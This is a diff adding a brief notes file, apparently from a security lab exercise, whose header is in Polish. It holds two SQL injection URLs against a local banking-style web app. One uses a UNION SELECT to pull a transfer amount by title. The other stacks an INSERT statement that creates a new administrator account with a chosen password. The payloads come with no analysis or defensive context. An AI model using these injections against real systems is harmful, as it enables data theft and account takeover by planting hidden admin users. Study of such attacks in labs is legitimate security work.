@@ -1,0 +1,5 @@
+wartość transferu p tytule 'bbb'
+http://127.0.0.1:1234/view_transfer_b?title=' UNION SELECT amount, 'TEST2', 'TEST3', 'TEST4', 'TEST5', 'TEST6', 'TEST7' FROM transfers WHERE title = 'bbb' AND ''='
+
+http://127.0.0.1:1234/view_transfer_b?title=' UNION SELECT 'TEST1', 'TEST2', 'TEST3', 'TEST4', 'TEST5', 'TEST6', 'TEST7'; INSERT INTO users(login, password, email, isAdmin) VALUES ("userAdmin2","pass","mailAdmin2@gmail.com", true);, UNION SELECT 'TEST1', 'TEST2', 'TEST3', 'TEST4', 'TEST5', 'TEST6', 'TEST7
+
